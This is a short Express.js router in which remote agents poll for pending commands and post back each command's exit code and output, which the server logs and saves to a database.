const express = require("express");
const router = express.Router();
const Command = require("../models/Command");

// agent polls for commands
router.get("/:agent_id", async (req, res) => {
  const cmds = await Command.find({
    agent_id: req.params.agent_id,
    status: "pending"
  });
  
  res.json(cmds.map(cmd => ({
    _id: cmd._id,
    agent_id: cmd.agent_id,
    payload: cmd.command,
    status: cmd.status
  })));
});

router.post("/result/:id", async (req, res) => {
  console.log("📥 Result endpoint hit");
  console.log("📥 Content-Type:", req.headers['content-type']);
  
  let body = req.body;
  
  // If content-type is text/plain, parse it manually
  if (req.headers['content-type'] === 'text/plain') {
    console.log("⚠️ Agent sent text/plain, parsing manually");
    try {
      body = JSON.parse(req.body);
    } catch (e) {
      console.error("❌ Failed to parse text as JSON:", e);
      return res.status(400).json({ error: "Invalid JSON in text/plain body" });
    }
  }
  
  console.log("📥 Parsed body:", body);
  
  if (!body || body.exit_code === undefined || body.output === undefined) {
    console.error("❌ Missing fields:", body);
    return res.status(400).json({ error: "Missing exit_code or output", received: body });
  }
  
  const { exit_code, output } = body;
  
  try {
    await Command.findByIdAndUpdate(req.params.id, {
      status: "done",
      exit_code: exit_code,
      output: output,
      completed_at: new Date()
    });
    
    console.log("✅ Result saved");
    res.json({ ok: true });
    
  } catch (error) {
    console.error("❌ Database error:", error);
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;